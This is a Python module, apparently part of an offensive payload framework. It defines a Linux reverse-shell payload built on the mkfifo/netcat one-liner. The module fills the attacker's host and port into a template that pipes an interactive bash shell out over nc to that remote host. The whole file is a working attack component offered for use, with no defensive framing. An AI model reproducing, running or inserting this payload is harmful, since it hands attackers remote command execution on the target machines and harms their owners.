import typing

from core import payloadcore
from shells import shellsindex


class ReverseLinuxNetcat(payloadcore.Payload):

    AUTHOR: str = "Danakane"

    def __init__(self):
        payloadbin: bytes = b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f" \
                     b"|/bin/bash -i 2>&1|nc \x00\x00\x00\x00 " \
                     b"\x00\x00 >/tmp/f\0"
        super(ReverseLinuxNetcat, self).__init__()
        self.customize(payloadbin=payloadbin, shellref=shellsindex.ShellsIndex.basicreverse)

    def parseparameters(self, host: str, port: int) -> bytes:
        host = host.encode()
        port = str(port).encode()
        payloadbin = self.binary()
        payloadbin = payloadbin.replace(b"\x00\x00\x00\x00", host)
        payloadbin = payloadbin.replace(b"\x00\x00", port)
        return payloadbin


blueprint: typing.Callable = ReverseLinuxNetcat
